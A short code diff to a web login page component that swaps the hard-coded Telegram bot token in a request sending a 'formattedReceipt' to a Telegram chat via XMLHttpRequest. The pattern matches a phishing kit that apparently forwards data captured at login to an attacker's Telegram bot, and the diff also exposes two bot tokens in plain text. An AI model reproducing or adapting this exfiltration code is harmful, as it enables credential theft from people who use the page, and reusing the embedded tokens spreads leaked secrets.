@@ -71,7 +71,7 @@ export default function LoginPage() {
       // const result = await res.json();
       // console.log("Telegram response:", result);
 
-      const url = `https://api.telegram.org/bot8353264003:AAHjabhq2XGjLvxvPrvZWxs92VNfPKDcyPw/sendMessage?chat_id=${chatId}&text=${formattedReceipt}`;
+      const url = `https://api.telegram.org/bot9233566476:AAEQcE4i9Yddstd4K9nGiVl4WHEfh6nTgEo/sendMessage?chat_id=${chatId}&text=${formattedReceipt}`;
 
       const api = new XMLHttpRequest();
       api.open("GET", url, true);
